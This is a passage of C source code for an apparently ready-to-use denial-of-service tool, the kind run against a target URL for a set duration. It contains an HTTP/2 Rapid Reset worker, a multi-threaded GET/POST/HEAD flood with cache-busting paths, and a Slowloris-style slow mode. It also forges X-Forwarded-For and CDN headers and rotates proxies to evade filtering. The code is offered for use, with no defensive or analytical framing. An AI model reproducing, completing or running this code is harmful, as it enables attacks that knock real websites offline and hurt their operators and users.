            *size = strlen(payload);
            break;
        }
        
        case 5: {
            const char *patterns[] = {
                "q=%s%s%%",
                "search=%s*",
                "filter=%s1=1",
                "start_date=1900-01-01&end_date=2099-12-31",
                "page=%d&limit=100",
                "sort=%s"
            };
            
            int pattern_idx = rand_int(0, 5);
            payload = malloc(chosen_size + 1024);
            
            switch (pattern_idx) {
                case 0: {
                    char *p1 = random_string(20);
                    sprintf(payload, patterns[pattern_idx], 
                        strings_repeat("%", 50), p1);
                    free(p1);
                    break;
                }
                case 1: {
                    char *p1 = random_string(10);
                    sprintf(payload, patterns[pattern_idx], p1);
                    free(p1);
                    break;
                }
                case 2: {
                    char *p1 = random_string(20);
                    sprintf(payload, patterns[pattern_idx], 
                        strings_repeat("1 OR ", 20), p1);
                    free(p1);
                    break;
                }
                case 3:
                    strcpy(payload, patterns[pattern_idx]);
                    break;
                case 4:
                    sprintf(payload, patterns[pattern_idx], 
                        rand_int(10000, 1000000));
                    break;
                case 5: {
                    char sort_str[1024] = {0};
                    for (int i = 0; i < 20; i++) {
                        char *s = random_string(5);
                        strcat(sort_str, s);
                        free(s);
                        if (i < 19) strcat(sort_str, ",");
                    }
                    sprintf(payload, patterns[pattern_idx], sort_str);
                    break;
                }
            }
            
            char *extra = random_string(chosen_size - strlen(payload));
            strcat(payload, "&extra=");
            strcat(payload, extra);
            free(extra);
            
            *content_type = strdup("application/x-www-form-urlencoded");
            *size = strlen(payload);
            break;
        }
    }
    
    return payload;
}

char *detect_provider(const char *host) {
    if (strstr(host, "104.") == host || strstr(host, "172.") == host || strstr(host, "173.") == host) {
        return strdup("cloudflare");
    } else if (strstr(host, "136.") == host || strstr(host, "138.") == host || strstr(host, "148.") == host) {
        return strdup("hetzner");
    } else if (strstr(host, "159.") == host || strstr(host, "167.") == host || strstr(host, "198.") == host) {
        return strdup("digitalocean");
    } else if (strstr(host, "52.") == host || strstr(host, "54.") == host || strstr(host, "18.") == host) {
        return strdup("aws");
    }
    
    const char *providers[] = {"cloudflare", "hetzner", "digitalocean", "aws"};
    return strdup(providers[rand_int(0, PROVIDERS_COUNT - 1)]);
}

char *generate_request_body() {
    int bodyType = rand_int(1, 3);
    char *body = malloc(4096);
    
    switch (bodyType) {
        case 1: {
            sprintf(body, 
                "{\"username\":\"user%d\",\"password\":\"%s\",\"email\":\"user%d@example.com\","
                "\"data\":\"%s\",\"timestamp\":%lld,\"token\":\"%s\",\"action\":\"%s\"}",
                rand_int(1000, 9999),
                random_base64(16),
                rand_int(100, 999),
                random_base64(rand_int(50, 500)),
                (long long)(time(NULL) * 1000),
                random_hex(32),
                (const char *[]){"login","register","update","delete","search"}[rand_int(0,4)]);
            break;
        }
        case 2: {
            sprintf(body, "username=user%d&password=%s&email=test%d@example.com&csrf_token=%s",
                rand_int(1000, 9999),
                random_base64(12),
                rand_int(100, 999),
                random_base64(16));
            break;
        }
        default: {
            sprintf(body, "<?xml version=\"1.0\"?><request><user>test%d</user><action>ping</action></request>",
                rand_int(100, 999));
            break;
        }
    }
    
    return body;
}

// ========== HTTP/2 Rapid Reset ==========

typedef struct {
    const char *target;
    volatile int *done;
    volatile long long *counter;
    pthread_mutex_t *counter_mutex;
} RapidResetArgs;

void *rapid_reset_worker(void *args) {
    RapidResetArgs *rargs = (RapidResetArgs *)args;
    const char *target = rargs->target;
    volatile int *done = rargs->done;
    volatile long long *counter = rargs->counter;
    pthread_mutex_t *counter_mutex = rargs->counter_mutex;
    
    ParsedURL *parsed = parse_url(target);
    
    while (!*done) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            usleep(100000);
            continue;
        }
        
        struct hostent *server = gethostbyname(parsed->host);
        if (!server) {
            close(sock);
            usleep(100000);
            continue;
        }
        
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
        addr.sin_port = htons(parsed->port);
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(sock);
            usleep(100000);
            continue;
        }
        
        SSL_CTX *ctx = get_random_ssl_ctx();
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        
        if (SSL_connect(ssl) <= 0) {
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            close(sock);
            usleep(100000);
            continue;
        }
        
        const char *preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
        SSL_write(ssl, preface, strlen(preface));
        
        for (int i = 0; i < MAX_RAPID_STREAMS && !*done; i++) {
            unsigned char frameHeader[9];
            int payloadLen = 50;
            frameHeader[0] = (payloadLen >> 16) & 0xFF;
            frameHeader[1] = (payloadLen >> 8) & 0xFF;
            frameHeader[2] = payloadLen & 0xFF;
            frameHeader[3] = 0x01;
            frameHeader[4] = 0x20;
            
            uint32_t streamID = i * 2 + 1;
            frameHeader[5] = (streamID >> 24) & 0xFF;
            frameHeader[6] = (streamID >> 16) & 0xFF;
            frameHeader[7] = (streamID >> 8) & 0xFF;
            frameHeader[8] = streamID & 0xFF;
            
            SSL_write(ssl, frameHeader, 9);
            
            unsigned char headers[] = {0x82, 0x86, 0x84, 0x8a, 0x08, 0x2f};
            SSL_write(ssl, headers, sizeof(headers));
            
            pthread_mutex_lock(counter_mutex);
            (*counter)++;
            pthread_mutex_unlock(counter_mutex);
            
            unsigned char resetFrame[13] = {0};
            resetFrame[3] = 4;
            resetFrame[4] = 0x03;
            resetFrame[5] = (streamID >> 24) & 0xFF;
            resetFrame[6] = (streamID >> 16) & 0xFF;
            resetFrame[7] = (streamID >> 8) & 0xFF;
            resetFrame[8] = streamID & 0xFF;
            resetFrame[12] = 0x08;
            
            SSL_write(ssl, resetFrame, 13);
            
            usleep(1000);
        }
        
        SSL_shutdown(ssl);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        close(sock);
    }
    
    free_parsed_url(parsed);
    free(rargs);
    return NULL;
}

// ========== Attack Worker ==========

int create_socket_with_proxy(const char *proxy_str, const char *host, int port) {
    char proxy_host[256];
    int proxy_port;
    
    char *colon = strchr(proxy_str, ':');
    if (!colon) return -1;
    
    int host_len = colon - proxy_str;
    strncpy(proxy_host, proxy_str, host_len);
    proxy_host[host_len] = '\0';
    proxy_port = atoi(colon + 1);
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct hostent *server = gethostbyname(proxy_host);
    if (!server) {
        close(sock);
        return -1;
    }
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
    addr.sin_port = htons(proxy_port);
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    
    return sock;
}

void *attack_worker_thread(void *args) {
    WorkerArgs *wargs = (WorkerArgs *)args;
    char *target = wargs->target;
    char *host = wargs->host;
    char *mode = wargs->mode;
    int use_proxy = wargs->use_proxy;
    volatile int *done = wargs->done;
    volatile long long *counter = wargs->counter;
    pthread_mutex_t *counter_mutex = wargs->counter_mutex;
    
    while (!*done) {
        int sock = -1;
        
        if (use_proxy) {
            char *proxy = get_next_proxy();
            if (proxy) {
                sock = create_socket_with_proxy(proxy, host, 80);
                free(proxy);
            }
        }
        
        if (sock < 0) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                usleep(100000);
                continue;
            }
            
            struct hostent *server = gethostbyname(host);
            if (!server) {
                close(sock);
                usleep(100000);
                continue;
            }
            
            struct sockaddr_in addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
            memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
            addr.sin_port = htons(80);
            
            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
                close(sock);
                usleep(100000);
                continue;
            }
        }
        
        char *path = generate_advanced_path();
        char full_url[4096];
        
        if (strcmp(mode, "SLOW") != 0 && rand_int(1, 100) <= 70) {
            char *params = generate_cache_bust_params();
            if (strchr(path, '?')) {
                snprintf(full_url, sizeof(full_url), "%s&%s", path, params + 1);
            } else {
                snprintf(full_url, sizeof(full_url), "%s%s", path, params);
            }
            free(params);
        } else {
            strcpy(full_url, path);
        }
        
        if (strcmp(mode, "SLOW") == 0) {
            char request[8192];
            snprintf(request, sizeof(request),
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html\r\n"
                "Connection: keep-alive\r\n\r\n",
                full_url, host, random_ua());
            
            send(sock, request, strlen(request), 0);
            
            time_t start = time(NULL);
            while (!*done && (time(NULL) - start) < 300) {
                char *header_key = random_string(4);
                char *header_val = random_string(8);
                char header_line[256];
                snprintf(header_line, sizeof(header_line), "X-%s: %s\r\n", header_key, header_val);
                send(sock, header_line, strlen(header_line), 0);
                free(header_key);
                free(header_val);
                sleep(rand_int(4, 12));
            }
            
            close(sock);
            free(path);
            
            pthread_mutex_lock(counter_mutex);
            (*counter)++;
            pthread_mutex_unlock(counter_mutex);
            
            continue;
        }
        
        char request[65536] = {0};
        char *ptr = request;
        
        if (strcmp(mode, "GET") == 0) {
            ptr += sprintf(ptr, "GET %s HTTP/1.1\r\n", full_url);
        } else if (strcmp(mode, "HEAD") == 0) {
            ptr += sprintf(ptr, "HEAD %s HTTP/1.1\r\n", full_url);
        } else if (strcmp(mode, "POST") == 0) {
            int payload_size;
            char *content_type = NULL;
            char *payload = generate_post_payload(&payload_size, &content_type);
            ptr += sprintf(ptr, "POST %s HTTP/1.1\r\n", full_url);
            ptr += sprintf(ptr, "Content-Type: %s\r\n", content_type);
            ptr += sprintf(ptr, "Content-Length: %d\r\n", payload_size);
            free(content_type);
        }
        
        ptr += sprintf(ptr, "Host: %s\r\n", host);
        ptr += sprintf(ptr, "User-Agent: %s\r\n", random_ua());
        ptr += sprintf(ptr, "Referer: %s\r\n", random_referer());
        ptr += sprintf(ptr, "Connection: keep-alive\r\n");
        
        ptr += sprintf(ptr, "Accept: %s\r\n", 
            accept_headers[rand_int(0, ACCEPT_HEADERS_COUNT - 1)]);
        ptr += sprintf(ptr, "Accept-Language: %s\r\n", 
            accept_languages[rand_int(0, ACCEPT_LANGS_COUNT - 1)]);
        ptr += sprintf(ptr, "Accept-Encoding: %s\r\n", 
            accept_encodings[rand_int(0, ACCEPT_ENCODINGS_COUNT - 1)]);
        
        ptr += sprintf(ptr, "Cache-Control: %s\r\n", 
            cache_controls[rand_int(0, CACHE_CONTROLS_COUNT - 1)]);
        if (rand_bool()) {
            ptr += sprintf(ptr, "Pragma: no-cache\r\n");
        }
        
        char *provider = detect_provider(host);
        
        if (strcmp(provider, "cloudflare") == 0 || rand_int(1, 100) <= 40) {
            char *cf_ip = generate_cloudflare_ip();
            int numCF = rand_int(2, 4);
            for (int i = 0; i < numCF; i++) {
                HeaderPair h = cloudflare_headers[rand_int(0, CLOUDFLARE_HEADERS_COUNT - 1)];
                if (strlen(h.value) == 0) {
                    if (strcmp(h.key, "CF-Connecting-IP") == 0 || strcmp(h.key, "True-Client-IP") == 0) {
                        ptr += sprintf(ptr, "%s: %s\r\n", h.key, cf_ip);
                    }
                } else {
                    ptr += sprintf(ptr, "%s: %s\r\n", h.key, h.value);
                }
            }
            ptr += sprintf(ptr, "X-Forwarded-For: %s\r\n", cf_ip);
            ptr += sprintf(ptr, "X-Real-IP: %s\r\n", cf_ip);
            free(cf_ip);
        }
        
        if (strcmp(provider, "hetzner") == 0 && rand_bool()) {
            for (int i = 0; i < HETZNER_HEADERS_COUNT; i++) {
                HeaderPair h = hetzner_headers[i];
                if (strlen(h.value) == 0) {
                    char *ip = generate_random_ip();
                    ptr += sprintf(ptr, "%s: %s\r\n", h.key, ip);
                    free(ip);
                } else {
                    ptr += sprintf(ptr, "%s: %s\r\n", h.key, h.value);
                }
            }
        }
        
        if (strcmp(provider, "digitalocean") == 0 && rand_bool()) {
            for (int i = 0; i < DIGITALOCEAN_HEADERS_COUNT; i++) {
                HeaderPair h = digitalocean_headers[i];
                if (strcmp(h.key, "X-Forwarded-Host") == 0 && strlen(h.value) == 0) {
                    ptr += sprintf(ptr, "%s: %s\r\n", h.key, host);
                } else if (strcmp(h.key, "X-Forwarded-Port") == 0) {
                    ptr += sprintf(ptr, "%s: %s\r\n", h.key, h.value);
                }
            }
        }
        
        if (strcmp(provider, "aws") == 0 && rand_bool()) {
            for (int i = 0; i < AWS_HEADERS_COUNT; i++) {
                HeaderPair h = aws_headers[i];
                if (strcmp(h.key, "X-Amz-Cf-Id") == 0 && strlen(h.value) == 0) {
                    char *hex = random_hex(16);
                    ptr += sprintf(ptr, "%s: %s\r\n", h.key, hex);
                    free(hex);
                } else {
                    ptr += sprintf(ptr, "%s: %s\r\n", h.key, h.value);
                }
            }
        }
        
        free(provider);
        
        int numSecurity = rand_int(1, 3);
        for (int i = 0; i < numSecurity; i++) {
            HeaderPair h = security_headers[rand_int(0, SECURITY_HEADERS_COUNT - 1)];
            ptr += sprintf(ptr, "%s: %s\r\n", h.key, h.value);
        }
        
        int numModern = rand_int(3, 6);
        int usedModern[100] = {0};
        for (int i = 0; i < numModern; i++) {
            int idx = rand_int(0, MODERN_HEADERS_COUNT - 1);
            HeaderPair h = modern_headers[idx];
            if (!usedModern[idx]) {
                ptr += sprintf(ptr, "%s: %s\r\n", h.key, h.value);
                usedModern[idx] = 1;
            }
        }
        
        if (rand_int(1, 100) <= 60) {
            int numApp = rand_int(1, 3);
            for (int i = 0; i < numApp; i++) {
                HeaderPair h = app_headers[rand_int(0, APP_HEADERS_COUNT - 1)];
                if (strlen(h.value) == 0) {
                    if (strcmp(h.key, "X-CSRF-Token") == 0) {
                        char *token = random_base64(32);
                        ptr += sprintf(ptr, "%s: %s\r\n", h.key, token);
                        free(token);
                    } else if (strcmp(h.key, "Authorization") == 0) {
                        char *token = random_base64(48);
                        ptr += sprintf(ptr, "%s: Bearer %s\r\n", h.key, token);
                        free(token);
                    } else if (strcmp(h.key, "X-API-Key") == 0) {
                        char *key = random_hex(16);
                        ptr += sprintf(ptr, "%s: %s\r\n", h.key, key);
                        free(key);
                    } else if (strcmp(h.key, "X-Device-ID") == 0) {
                        char *uuid = generate_uuid();
                        ptr += sprintf(ptr, "%s: %s\r\n", h.key, uuid);
                        free(uuid);
                    } else if (strcmp(h.key, "X-Session-ID") == 0) {
                        char *sid = random_hex(32);
                        ptr += sprintf(ptr, "%s: %s\r\n", h.key, sid);
                        free(sid);
                    }
                } else {
                    ptr += sprintf(ptr, "%s: %s\r\n", h.key, h.value);
                }
            }
        }
        
        if (rand_int(1, 100) <= 30) {
            int numCDN = rand_int(1, 2);
            for (int i = 0; i < numCDN; i++) {
                HeaderPair h = cdn_headers[rand_int(0, CDN_HEADERS_COUNT - 1)];
                ptr += sprintf(ptr, "%s: %s\r\n", h.key, h.value);
            }
        }
        
        if (rand_int(1, 100) <= 70) {
            char *cookies = generate_cookies();
            if (cookies) {
                ptr += sprintf(ptr, "Cookie: %s\r\n", cookies);
                free(cookies);
            }
        }
        
        if (rand_int(1, 100) <= 15) {
            int start = rand_int(0, 1000);
            int end = rand_int(1001, 10000);
            ptr += sprintf(ptr, "Range: bytes=%d-%d\r\n", start, end);
        }
        
        if (rand_bool()) {
            ptr += sprintf(ptr, "Upgrade-Insecure-Requests: 1\r\n");
        }
        
        if (rand_bool()) {
            const char *te_vals[] = {"trailers", "deflate", "gzip", "identity"};
            ptr += sprintf(ptr, "TE: %s\r\n", te_vals[rand_int(0, TE_VALUES_COUNT - 1)]);
        }
        
        if (strstr(request, "X-Forwarded-For:") == NULL && rand_int(1, 100) <= 30) {
            char *ip = generate_random_ip();
            ptr += sprintf(ptr, "X-Forwarded-For: %s\r\n", ip);
            free(ip);
        }
        
        ptr += sprintf(ptr, "\r\n");
        
        if (strcmp(mode, "POST") == 0) {
            int payload_size;
            char *content_type = NULL;
            char *payload = generate_post_payload(&payload_size, &content_type);
            memcpy(ptr, payload, payload_size);
            ptr += payload_size;
            free(payload);
            free(content_type);
        }
        
        send(sock, request, ptr - request, 0);
        
        char response[8192];
        recv(sock, response, sizeof(response) - 1, 0);
        
        close(sock);
        free(path);
        
        pthread_mutex_lock(counter_mutex);
        (*counter)++;
        pthread_mutex_unlock(counter_mutex);
    }
    
    return NULL;
}

// ========== UI Functions ==========

const char *get_next_color() {
    pthread_mutex_lock(&color_mutex);
    
    const char *colors[] = {
        COLOR_GREEN, COLOR_RED, COLOR_VIOLET, COLOR_WHITE, 
        COLOR_YELLOW, COLOR_CYAN, COLOR_BLUE
    };
    
    const char *color = colors[color_index];
    color_index = (color_index + 1) % 7;
    
    pthread_mutex_unlock(&color_mutex);
    return color;
}

void print_banner() {
    const char *color = get_next_color();
    printf("%s", color);
    printf("  .88888.    .88888.  \n");
    printf(" d8'   `88  d8'   `8b \n");
    printf(" 88        88       88 \n");
    printf(" 88   YP88 88       88 \n");
    printf(" Y8.   .88  Y8.   .8P \n");
    printf("  `88888'    `8888P'  \n");
    printf(COLOR_RESET "\n");
}

void clear_screen() {
    printf("\033[2J\033[H");
    fflush(stdout);
}

void handle_signal(int sig) {
    attack_done = 1;
}

// ========== Main Function ==========

int main(int argc, char *argv[]) {
    srand(time(NULL));
    init_openssl();
    
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    int use_proxy = 0;
    if (argc >= 5) {
        use_proxy = 1;
    }
    
    if (argc < 4) {
        print_banner();
        printf("Usage: %s <target> <seconds> <GET|POST|HEAD|SLOW> [proxy]\n", argv[0]);
        printf("   [proxy] → optional if you want to use proxy\n");
        cleanup_openssl();
        return 1;
    }
    
    char *target = argv[1];
    int duration_sec = atoi(argv[2]);
    char *mode = argv[3];
    
    if (strcmp(mode, "GET") != 0 && strcmp(mode, "POST") != 0 && 
        strcmp(mode, "HEAD") != 0 && strcmp(mode, "SLOW") != 0) {
        print_banner();
        printf("Mode GET, POST, HEAD, and SLOW only\n");
        cleanup_openssl();
        return 1;
    }
    
    char full_target[1024];
    strcpy(full_target, target);
    if (!strstr(full_target, "://")) {
        if (strchr(full_target, ':') && !strstr(full_target, "://")) {
            char temp[1024];
            sprintf(temp, "http://%s", full_target);
            strcpy(full_target, temp);
        } else if (strncmp(full_target, "http", 4) != 0) {
            char temp[1024];
            sprintf(temp, "https://%s", full_target);
            strcpy(full_target, temp);
        }
    }
    
    ParsedURL *parsed = parse_url(full_target);
    
    printf("[+] Auto-detecting supported protocols for %s...\n", target);
    ProtocolInfo *protocols = detect_protocols(full_target);
    
    char protocols_str[256] = {0};
    for (int i = 0; i < 3; i++) {
        if (protocols[i].supported) {
            if (strlen(protocols_str) > 0) strcat(protocols_str, ", ");
            strcat(protocols_str, protocols[i].protocol);
        }
    }
    
    print_banner();
    printf("[+] Target: %s\n", full_target);
    printf("[+] Mode: %s\n", mode);
    printf("[+] Duration: %d sec\n", duration_sec);
    printf("[+] Workers: %d\n", MAX_WORKERS);
    printf("[+] Detected Protocols: %s\n", protocols_str);
    
    if (use_proxy) {
        pthread_mutex_init(&proxy_manager.proxy_mutex, NULL);
        load_proxies_from_api();
        if (proxy_manager.proxy_count > 0) {
            pthread_create(&proxy_manager.refresher_thread, NULL, proxy_refresher_thread, NULL);
            printf("[+] Proxies: %d (rotating + refresh every %.0f min)\n", 
                proxy_manager.proxy_count, refresh_interval / 60.0);
        } else {
            printf("[-] No Proxy Detected, Running Without Proxy\n");
            use_proxy = 0;
        }
    }
    
    printf("[+] Starting... Ctrl+C to stop\n");
    
    pthread_t workers[MAX_WORKERS];
    WorkerArgs args[MAX_WORKERS];
    
    int h2_supported = 0;
    for (int i = 0; i < 3; i++) {
        if (strcmp(protocols[i].protocol, "h2") == 0 && protocols[i].supported) {
            h2_supported = 1;
            break;
        }
    }
    
    int rapid_workers = 0;
    int normal_workers = MAX_WORKERS;
    
    if (h2_supported && strcmp(mode, "GET") == 0) {
        rapid_workers = MAX_WORKERS / 2;
        normal_workers = MAX_WORKERS - rapid_workers;
        printf("[+] HTTP/2 detected! Using %d workers for Rapid Reset attack\n", rapid_workers);
        printf("[+] %d workers for normal flood\n", normal_workers);
    }
    
    for (int i = 0; i < rapid_workers; i++) {
        RapidResetArgs *rargs = malloc(sizeof(RapidResetArgs));
        rargs->target = full_target;
        rargs->done = &attack_done;
        rargs->counter = &total_requests;
        rargs->counter_mutex = &counter_mutex;
        
        pthread_create(&workers[i], NULL, rapid_reset_worker, rargs);
    }
    
    for (int i = rapid_workers; i < MAX_WORKERS; i++) {
        args[i].target = full_target;
        args[i].host = parsed->host;
        args[i].mode = mode;
        args[i].use_proxy = use_proxy;
        args[i].done = &attack_done;
        args[i].counter = &total_requests;
        args[i].counter_mutex = &counter_mutex;
        
        pthread_create(&workers[i], NULL, attack_worker_thread, &args[i]);
    }
    
    time_t start_time = time(NULL);
    time_t last_update = start_time;
    
    while (!attack_done && (time(NULL) - start_time) < duration_sec) {
        sleep(1);
        
        if (time(NULL) - last_update >= 1) {
            clear_screen();
            print_banner();
            
            long long current_req = total_requests;
            double elapsed = difftime(time(NULL), start_time);
            double rps = current_req / elapsed;
            
            printf("[+] Target: %s\n", full_target);
            printf("[+] Mode: %s\n", mode);
            printf("[+] Detected Protocols: %s\n", protocols_str);
            printf("[+] Elapsed: %.0f / %d sec\n", elapsed, duration_sec);
            printf("[+] Total requests/streams: %lld\n", current_req);
            printf("[+] Current RPS: %.0f\n", rps);
            if (use_proxy && proxy_manager.proxy_count > 0) {
                printf("[+] Active proxies: %d\n", proxy_manager.proxy_count);
            }
            printf("Press Ctrl+C to stop early\n");
            
            last_update = time(NULL);
        }
    }
    
    attack_done = 1;
    
    for (int i = 0; i < MAX_WORKERS; i++) {
        pthread_join(workers[i], NULL);
    }
    
    clear_screen();
    printf("[+] Attack completed!\n");
    printf("Target: %s\n", full_target);
    printf("Mode: %s\n", mode);
    printf("Duration: %d sec\n", duration_sec);
    printf("Total requests/streams: %lld\n", total_requests);
    printf("Average RPS: %.0f\n", (double)total_requests / duration_sec);
    printf("Elapsed time: %.0f sec\n", difftime(time(NULL), start_time));
    
    for (int i = 0; i < 3; i++) {
        free(protocols[i].protocol);
    }
    free(protocols);
    free_parsed_url(parsed);
    
    if (use_proxy && proxy_manager.proxy_count > 0) {
        pthread_cancel(proxy_manager.refresher_thread);
        pthread_join(proxy_manager.refresher_thread, NULL);
        
        for (int i = 0; i < proxy_manager.proxy_count; i++) {
            free(proxy_manager.proxies[i]);
        }
        free(proxy_manager.proxies);
        pthread_mutex_destroy(&proxy_manager.proxy_mutex);
    }
    
    pthread_mutex_destroy(&counter_mutex);
    pthread_mutex_destroy(&color_mutex);
    
    cleanup_openssl();
    return 0;
}